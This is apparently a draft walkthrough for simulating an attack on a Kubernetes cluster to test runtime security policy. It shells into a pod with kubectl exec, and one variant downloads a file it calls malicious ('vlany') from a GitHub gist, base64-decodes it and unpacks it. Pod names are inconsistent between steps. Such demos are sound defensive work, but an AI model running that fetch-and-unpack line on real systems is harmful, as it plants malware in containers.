# The Attack

<<Need to finalize and test these steps on production

Let's simulate an attack on our cluster.  In this example we will use `kubectl exec` to download a `tar` file, explode it and run some other nefarious commands.

First let's create a deployment.

```
$ kubectl create ns voting-app
$ kubectl apply -f manifests/ -n voting-app
$ kubectl get pods -n voting-app

```
Verify the Pod has STATUS 'Running' and READY '1/1'

```
$ kubectl get pods -n voting-app
NAME                      READY   STATUS    RESTARTS   AGE
voting-65f88748fd-mbhcc   1/1     Running   0          5m54s
```

Make a note the Pod name.


Now that the deployment is running, let's simulate the attack.  Run the following command to create a shell into the running Container, substituting the pod name as appropriate

```
$ kubectl exec -it nginx-65f88748fd-mbhcc -n voting-app-- /bin/bash
root@nginx-65f88748fd-mbhcc:/#
```

Create a directory in the container

```
$ mkdir policy-test
root@nginx-65f88748fd-mbhcc:/# command terminated with exit code 137
$
```

<<< Or this
Let's use Helm to install a nginx container:

`helm repo add bitnami https://charts.bitnami.com
helm install --name example bitnami/nginx`

You can check that the container is running, and the name of the pod by running  
`kubectl get pod -l app=example-nginx`

Now let's play the attacker, and spawn a shell:  
`kubectl exec -it YOUR_POD_NAME -c example-nginx -- /bin/bash`  
You can get the value of `YOUR_POD_NAME` from the previous command.

You will be presented with a command prompt similar to this:  
`I have no name!@example-nginx-769dfcf684-l4m67:/app$`

You can execute a few commands inside the container, or even download some malicious file.  
`apt-get update &&
apt-get install curl -y &&
cd /tmp &&
curl https://gist.githubusercontent.com/mateobur/d888e36de12f8fe42a18f54ce4b1fc7c/raw/dd0c4cb23db7cc17a2086c5dee9338522fb8ae69/vlany | base64 -d > vlany-master.tar.gz &&
tar zxvf vlany-master.tar.gz`
